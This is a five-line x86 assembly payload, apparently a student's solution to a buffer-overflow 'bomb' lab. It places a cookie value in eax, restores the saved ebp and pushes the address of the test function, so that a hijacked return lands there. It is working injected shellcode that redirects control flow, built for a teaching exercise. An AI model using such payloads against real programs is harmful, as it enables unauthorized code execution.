# move cookie to return address for bomb
  movl  $0x58c608ec, %eax # put cookie into eax
  movl  $0xffff7d40, %ebp #restore old ebp value 
  push  $0x08048a12	  # push the address of test onto the stack
  ret
